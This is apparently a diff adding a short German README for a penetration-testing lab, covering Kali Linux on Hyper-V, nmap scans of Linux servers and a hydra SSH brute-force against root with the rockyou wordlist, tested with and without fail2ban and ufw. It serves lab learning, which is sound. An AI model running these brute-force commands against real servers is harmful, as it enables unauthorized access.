@@ -1,0 +1,24 @@
+# Kali und Pentest
+
+## Ziel des Projekts
+Angriff auf Server mit Kali Linux
+
+## Systemumgebung
+- Kali 6.16.8
+- HyperV
+- Dienste: nmap, hydra
+
+## Schritte
+1. Installation von ISO
+2. Untersuchung der Linux Server mit nmap 
+3. Angriff auf Server mit Hydra, im Ziel wurde mit und ohne fail2ban, mit und ohne ufw getestet.
+
+
+# Beispielbefehle hier
+host www.example.de
+
+nmap IPADRESSE
+nmap IPADRESSE -p 21,22,25,80 -sV
+
+hydra -l root -P /usr/share/wordlists/rockyou.txt -s 22 -t 4 IPADRESSE ssh
+
